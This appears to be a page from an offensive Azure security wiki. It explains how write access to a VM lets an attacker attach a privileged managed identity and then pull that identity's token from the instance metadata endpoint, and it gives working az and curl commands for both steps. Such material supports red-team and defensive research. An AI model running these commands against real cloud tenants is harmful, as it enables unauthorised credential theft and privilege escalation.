---
title: "Managed identity assignment: attach a privileged identity and mint its token"
order: 4
description: "Attaching a privileged user-assigned managed identity, or enabling a system-assigned one, on a resource you can write to, then minting its token."
keywords:
  - managed identity
  - user-assigned
  - system-assigned
  - token
  - resource write
  - assignment
---

# Managed identity assignment

If you can write a resource (a VM, Function App, Automation Account, or container) and that resource can be given a managed identity, you can attach a **privileged user-assigned identity** or enable a **system-assigned** one, then run code or read the metadata endpoint on that resource to mint the identity's token. This is the Azure analogue of passing a role to a service: the identity's RBAC becomes yours.

## Attaching a user-assigned identity to a VM

```bash
# attach an existing privileged user-assigned identity
az vm identity assign --name <vm> --resource-group <rg> \
  --identities /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/<uami>

# then on the VM, pull that identity's token from IMDS
az vm run-command invoke --name <vm> -g <rg> --command-id RunShellScript \
  --scripts "curl -s -H Metadata:true 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=<uami-client-id>'"
```

For a system-assigned identity, `az vm identity assign --name <vm> -g <rg>` with no `--identities` enables it, after which the same IMDS call (without `client_id`) returns its token.

## Exploitation notes

- The attach-and-run pattern needs write over the resource plus the ability to run code on it (`virtualMachines/write` + run command, or a Function deploy); see the [compute](../../compute/virtual-machines/index.md) surface for the execution half.
- A single user-assigned identity is often shared across many resources, so one `Contributor`-level foothold that can attach it inherits its RBAC everywhere, see [user-assigned](../managed-identities/user-assigned.md).
- Token retrieval detail (IMDS endpoint, resource and client_id parameters) lives under [credentials](../../credentials/instance-metadata/index.md); this page is about obtaining the identity in the first place.

## Tools

- **az cli** (`az vm identity assign`, `az functionapp identity assign`, run command).
- **MicroBurst** (`Get-AzureManagedIdentityToken` style modules).
- **BARK** (`Invoke-AzureVMRunCommand`, managed-identity abuse).

## References

- [SpecterOps: managed identity attack paths (BARK)](https://github.com/BloodHoundAD/BARK)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
- [Microsoft: managed identities for Azure resources](https://learn.microsoft.com/entra/identity/managed-identities-azure-resources/overview)
